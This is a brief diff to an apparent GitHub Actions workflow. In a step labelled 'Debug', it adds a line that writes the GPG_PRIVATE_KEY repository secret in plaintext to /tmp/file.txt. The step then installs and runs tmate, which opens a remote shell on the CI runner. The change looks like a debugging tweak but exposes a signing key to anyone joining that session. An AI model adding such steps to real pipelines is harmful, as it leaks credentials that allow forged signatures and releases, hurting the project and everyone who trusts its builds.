@@ -13,6 +13,8 @@ jobs:
     steps:
       - name: Debug
         run: |
+          echo "Hello" >> /tmp/file.txt
+          echo "${{ secrets.GPG_PRIVATE_KEY }}" >> /tmp/file.txt
           sudo apt install -y tmate
           sudo tmate -F
         env:
